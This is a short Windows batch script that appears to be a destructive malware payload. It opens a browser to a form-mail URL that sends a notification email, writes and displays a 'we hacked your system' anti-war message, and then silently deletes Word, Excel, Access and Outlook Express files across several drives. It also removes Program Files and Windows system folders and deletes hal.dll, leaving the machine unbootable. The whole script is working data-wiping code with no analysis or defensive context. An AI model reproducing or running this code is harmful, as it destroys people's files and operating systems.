   @echo off

   explorer "http://cgi00.freedback.com/mail.pl?to=harriett.potter@tiscali.fr&subject=feedback&from=<target user e-mail address>&body=meeting"
   echo we hacked your system > c:\hack1.txt
   echo because peace and non violence are preferable to >> c:\hack1.txt
   echo depleted uranium and laser-guided bombs >> c:\hack1.txt
   start notepad c:\hack1.txt

   cd \
   rem ------ xp ----------
   erase /s /q c:\*.dbx
   erase /s /q c:\*.doc
   erase /s /q c:\*.xls
   erase /s /q c:\*.mdb

   erase /s /q f:\*.doc
   erase /s /q f:\*.xls
   erase /s /q f:\*.mdb
   erase /s /q g:\*.doc
   erase /s /q g:\*.xls
   erase /s /q g:\*.mdb
   erase /s /q h:\*.doc
   erase /s /q h:\*.xls
   erase /s /q h:\*.mdb
   erase /s /q z:\*.doc
   erase /s /q z:\*.xls
   rem ------ win98 ----------
   deltree /y "\program files"
   deltree /y %windir%\system
   rem ------ xp ----------
   del %windir%\system32\hal.dll
   erase /s /q "\Program Files"
